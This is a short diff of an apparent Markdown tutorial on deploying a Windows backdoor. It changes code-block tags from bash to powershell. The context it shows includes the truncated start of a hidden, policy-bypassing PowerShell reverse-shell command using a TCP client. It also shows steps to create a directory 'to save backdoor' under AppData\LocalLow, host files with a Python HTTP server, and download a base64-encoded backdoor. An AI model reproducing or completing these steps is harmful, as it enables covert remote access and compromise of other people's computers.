@@ -17,12 +17,12 @@ powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Socke
 ```
 ## Make Directory
 Make Directory to save backdoor
-``` bash
+``` powershell
 mkdir C:\Users\[User_name]\AppData\LocalLow\Temp
 ```
 ## Use python to make server
 
-``` bash
+``` powershell 
 python -m http.server
 ```
 ## Download String base64 backdoor
